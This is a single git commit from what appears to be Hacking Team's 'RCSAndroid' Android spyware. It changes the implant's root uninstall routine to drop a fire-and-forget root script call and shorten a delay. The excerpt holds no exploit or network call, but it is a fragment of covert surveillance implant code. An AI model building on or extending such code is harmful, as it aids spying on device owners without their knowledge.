beab33a9a901501079399449b97124a0cfc1bae1
zad <e.placidi@hackingteam.com>
2015-06-04 17:49:23 +0200

    removed executeRootAndForgetScript usage to clean remove installation check any sideeffect in persistence

--- RCSAndroid/src/com/android/dvci/Root.java
+++ RCSAndroid/src/com/android/dvci/Root.java
@@ -459,12 +459,9 @@ public class Root {
 				}
 			}
 			Core.serivceUnregister();
-			boolean ret = Execute.executeRootAndForgetScript(script);
-			if(!ret){
-				Execute.executeScript(script);
-			}
-
-			Utils.sleep(5000);
+			// removed executeRootAndForget call, todo: check any side effects when persistent
+			Execute.executeScript(script);
+			Utils.sleep(1000);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
